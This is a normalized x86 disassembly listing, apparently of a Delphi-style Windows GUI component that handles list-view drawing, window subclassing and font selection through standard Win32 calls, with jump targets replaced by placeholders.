mov [ eax + 0x14 ] edx
mov eax [ esi + 0x2dc ]
add eax 0x24
mov edx [ ebp - 0x4 ]
call sub_3a652f4
test [ ebp - 0x5 ] 0x2
je r-xdata
sub_3add350
test al 0x1
je r-xdata
test al 0x8
je r-xdata
xor eax eax
retn
test al 0x2
je r-xdata
mov al 0x1
jmp r-xdata
test al 0x40
je r-xdata
mov al 0x2
jmp r-xdata
retn
xor eax eax
mov al 0x3
jmp r-xdata
sub_3add374
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test esi 0x20
je r-xdata
test esi 0x4
je r-xdata
or bl 0x20
test esi 0x8
je r-xdata
or bl 0x2
test esi 0x1
je r-xdata
or bl 0x4
test esi 0x2
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_3add3bd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff5c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3ade1d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebp - 0xc ]
mov esi [ esi + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xffffff97
jg r-xdata
cmp eax 0xffffff9c
jg r-xdata
je r-xdata
sub eax 0xfffffff4
je r-xdata
je r-xdata
mov eax [ ebp - 0xc ]
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3add204
mov edi eax
mov edx edi
mov eax [ ebp - 0x8 ]
mov si 0xffaf
call sub_3a6457c
test al al
jne r-xdata
cmp eax 0xffffff8d
jg r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0xc ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x278 ]
call sub_3adabcc
mov edx eax
mov ecx [ ebx + 0x1c ]
mov eax [ ebp - 0x8 ]
mov si 0xffb0
call sub_3a6457c
test al al
jne r-xdata
sub eax 0xffffff98
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x1
sub eax 0xffffff8f
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ade1dd
lea eax [ ebp - 0x9c ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov edx [ ebp - 0xc ]
mov [ ebp - 0x20 ] esi
xor edx edx
push ebp
push sub_3addce5
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_3a89f78
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xc ]
test eax 0x10000
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x27d ] 0x1
sub eax 0x3
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x278 ]
call sub_3adab94
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_3ab7c38
mov ebx eax
push 0x0
push 0x0
push 0x1018
push ebx
call __imp_SendMessageA
mov edx [ ebp - 0x8 ]
mov ebx eax
mov [ edx + 0x2a4 ] ebx
push 0xfffffffc
push ebx
call GetWindowLongA
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2a0 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x29c ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2a4 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax esi
mov ecx [ eax + 0x10 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x12c ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp - 0xc ]
mov ebx esi
mov eax [ ebx + 0x14 ]
call sub_3add374
push eax
mov eax [ ebx + 0x18 ]
call sub_3add374
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x130 ]
jmp r-xdata
sub eax 0xfffffecc
je r-xdata
test eax 0x20000
setne [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0x0
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xc ]
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x27c ] 0x1
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x278 ]
mov edx ebx
call sub_3adabcc
mov edx eax
mov eax [ ebp - 0x8 ]
mov si 0xffab
call sub_3a6457c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ esi + 0x28 ]
mov eax [ ebp - 0x8 ]
mov si 0xffab
call sub_3a6457c
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2b8 ] eax
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0xc ]
mov ebx esi
mov esi [ ebx + 0x14 ]
test [ esi ] 0x1
je r-xdata
sub eax 0x97
je r-xdata
lea eax [ ebp - 0x5c ]
xor ecx ecx
mov edx 0x28
call sub_3a63a44
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xc ]
mov edx eax
and edx 0x10001
cmp edx 0x10001
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x278 ]
call sub_3adabcc
mov edx eax
mov eax [ ebp - 0x8 ]
mov si 0xffa9
call sub_3a6457c
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_3adfb48
mov edx eax
mov eax [ ebp - 0x8 ]
mov si 0xffad
call sub_3a6457c
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3adea98
mov eax [ eax + 0x18 ]
cmp eax [ esi + 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x3aa ] 0x0
je r-xdata
sub eax 0x5
je r-xdata
mov edx eax
and edx 0x10002
cmp edx 0x10002
jne r-xdata
xor edx edx
push ebp
push sub_3adda25
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x20 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
call sub_3a8a3c8
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
call sub_3a8a25c
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x1a4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
call sub_3a8a278
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x8 ] sub_3adf458
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_3adf458
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2da ] 0x0
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call sub_3a64ce0
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
jne r-xdata
xor eax eax
push ebp
push sub_3add637
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x20 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
call sub_3a8a3c8
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
call sub_3a8a25c
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x1a4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
call sub_3a8a278
lea edx [ ebp - 0x34 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x110 ]
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
xor edx edx
call sub_3a8a3c8
retn
mov cl 0x1
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0xc ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x278 ]
call sub_3adabcc
mov edi eax
mov ecx [ ebx + 0x1c ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov si 0xffae
call sub_3a6457c
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x3ba ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax esi
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3adea98
mov eax [ eax + 0x14 ]
cmp eax [ esi + 0x4 ]
jg r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3adea98
mov eax [ eax + 0x18 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3adea98
pop edx
call sub_3ad9c1c
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3abcf30
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3ad0678
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ebx esi
mov eax [ ebx + 0x10 ]
call sub_3add350
mov [ ebp - 0xe ] al
xor esi esi
lea eax [ ebp - 0x4 ]
call sub_3a652a0
lea ecx [ ebp - 0x16 ]
xor edx edx
xor eax eax
call sub_3a67378
mov [ ebp - 0x17 ] 0x4
movzx eax [ ebp - 0xe ]
sub al 0x1
jb r-xdata
sub eax 0x2
je r-xdata
mov edx eax
and edx 0x10003
cmp edx 0x10003
jne r-xdata
xor eax eax
push ebp
push sub_3addb99
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x20 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
call sub_3a8a3c8
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
call sub_3a8a25c
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x1a4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
call sub_3a8a278
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x8 ]
call sub_3add204
mov edx eax
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov [ ebp - 0xd ] al
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x28 ]
push eax
push 0x0
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x8 ]
call sub_3add204
mov edx eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
mov [ ebp - 0xd ] al
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x20
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
call sub_3a8a234
retn
lea edx [ ebp - 0x34 ]
mov cl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x110 ]
jmp r-xdata
mov cl 0x2
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x1c ] 0x8
jne r-xdata
cmp [ eax + 0x10 ] 0xffffffff
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3adea98
mov eax [ eax + 0x14 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3adea98
pop edx
call sub_3ad9c1c
jmp r-xdata
mov esi [ ebx + 0x18 ]
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0xc ]
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3add204
mov edi eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0xc ]
test [ ebx ] 0x1
je r-xdata
jmp r-xdata
and eax 0x10004
cmp eax 0x10004
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x8 ]
call sub_3add204
mov edx eax
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x28 ]
push eax
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x8 ]
call sub_3add204
mov edx eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x4
call sub_3a64ce0
call sub_3a64ce0
jmp r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
lea edx [ ebp - 0x34 ]
mov cl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x110 ]
jmp r-xdata
mov cl 0x3
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x18 ] 0x2
je r-xdata
lea edx [ eax + 0xc ]
mov eax [ ebp - 0x8 ]
mov si 0xffaa
call sub_3a6457c
jmp r-xdata
lea eax [ ebp - 0x16 ]
push eax
push esi
mov eax [ ebx + 0xc ]
push eax
movzx eax [ ebp - 0x17 ]
push eax
test [ ebx + 0x10 ] 0x20
setne al
push eax
mov eax [ ebx + 0x10 ]
call sub_3add350
mov edx eax
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x128 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0xc ] eax
jmp r-xdata
cmp [ ebx + 0x14 ] 0x0
je r-xdata
je r-xdata
test [ ebx ] 0x2
je r-xdata
mov esi [ ebx + 0x8 ]
test esi esi
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x8 ]
call sub_3add204
mov edx eax
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x28 ]
push eax
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x8 ]
call sub_3add204
mov edx eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
xor edx edx
call sub_3a8a3c8
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adda2c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
xor edx edx
call sub_3a8a3c8
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2da ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
mov eax [ eax + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
mov eax [ eax + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov ebx [ ebp - 0xc ]
mov ebx [ ebx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_3a88d54
mov [ ebx + 0x30 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
mov eax [ eax + 0x14 ]
call sub_3a89b18
call sub_3a88d54
mov [ ebx + 0x34 ] eax
lea eax [ ebp - 0x98 ]
push eax
push 0x3c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
mov eax [ eax + 0xc ]
call sub_3a89260
push eax
call GetObjectA
test eax eax
je r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x40
lea edx [ ebp - 0x34 ]
mov cl 0x3
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
test [ ebx + 0x18 ] 0x2
jne r-xdata
test [ ebx + 0x14 ] 0x2
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_3a652a0
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x14 ]
call sub_3a6a360
jmp r-xdata
mov eax [ ebx + 0x1c ]
mov [ ebp - 0x16 ] eax
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x12 ] eax
mov eax [ ebx + 0x24 ]
sub eax 0x25
je r-xdata
jmp r-xdata
test [ ebx ] 0x10
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jg r-xdata
mov ecx [ ebx + 0x18 ]
dec ecx
mov edx [ edi + 0x24 ]
mov eax [ ebx + 0x14 ]
call sub_3a6a208
jmp r-xdata
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x8 ]
call sub_3add204
mov edx eax
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x28 ]
push eax
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x8 ]
call sub_3add204
mov edx eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
xor edx edx
call sub_3a8a3c8
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x20
jmp r-xdata
mov cl 0x1
mov dl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
test [ ebx + 0x14 ] 0x2
je r-xdata
push 0x0
mov ebx [ ebp - 0x8 ]
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x3bc ]
call [ ebx + 0x3b8 ]
jmp r-xdata
mov [ ebp - 0x17 ] 0x0
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x14 ]
mov [ ebx + 0x24 ] eax
jmp r-xdata
mov esi [ ebx + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_3adec3c
mov eax [ edi + 0x10 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x26c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ eax ] 0x0
lea ecx [ ebp - 0x9c ]
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x24 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x9c ]
mov ecx [ ebx + 0x18 ]
dec ecx
mov eax [ ebx + 0x14 ]
call sub_3a6a208
jmp r-xdata
lea eax [ ebp - 0x98 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2e8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2e8 ]
push eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x10 ]
push eax
call SelectObject
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2ec ] eax
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x2
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
push 0x1
mov ebx [ ebp - 0x8 ]
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x3bc ]
call [ ebx + 0x3b8 ]
mov [ ebp - 0x17 ] 0x2
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax [ edi + 0x20 ]
inc eax
shl eax 0xc
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0xf000
or [ ebx ] 0x8
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2ec ] 0x0
je r-xdata
mov [ ebp - 0x17 ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov edx [ ebx + 0x8 ]
dec edx
mov eax edi
call sub_3adaa44
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebx + 0x8 ]
dec ecx
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_3adf730
mov eax [ ebp - 0x1c ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2ec ]
push eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2e8 ]
push eax
call DeleteObject
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x2e8 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x2ec ] edx
mov [ ebp - 0x17 ] 0x3
jmp r-xdata
sub_3adda2c
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
mov cl 0x3
mov dl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
call sub_3a8a234
retn
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x40
jmp r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x10
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x40
jmp r-xdata
sub_3ade1e4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov ebx eax
test [ ebx + 0x8c ] 0x4
je r-xdata
mov ecx [ esp ]
mov edx ebp
mov eax ebx
call sub_3ab7738
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x288 ]
call sub_3a7b21c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov eax [ esp ]
push eax
push ebp
mov edx esi
mov eax [ ebx + 0x288 ]
call sub_3ad9dc0
call sub_3ad9b9c
push eax
call MulDiv
push eax
mov edx esi
mov eax [ ebx + 0x288 ]
call sub_3ad9dc0
pop edx
call sub_3ad9c1c
inc esi
dec edi
jne r-xdata
sub_3ade278
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x332 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x334 ]
call [ ebx + 0x330 ]
sub_3ade2c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3ade321
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x278 ]
call sub_3adab2c
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3ada5a8
mov edx esi
mov eax ebx
call sub_3ada65c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ade328
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3ade330
push ebx
push ecx
mov [ esp ] 0x1
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x31a ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
mov cl 0x2
jmp r-xdata
sub_3ade378
push ebx
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x312 ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
mov cl 0x2
jmp r-xdata
sub_3ade3b0
push ebx
push esi
mov ebx edx
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x29 ] 0x0
jne r-xdata
cmp [ eax + 0x37a ] 0x0
je r-xdata
mov [ ebx + 0x29 ] 0x1
mov eax ebx
call sub_3ada47c
mov esi eax
mov ecx ebx
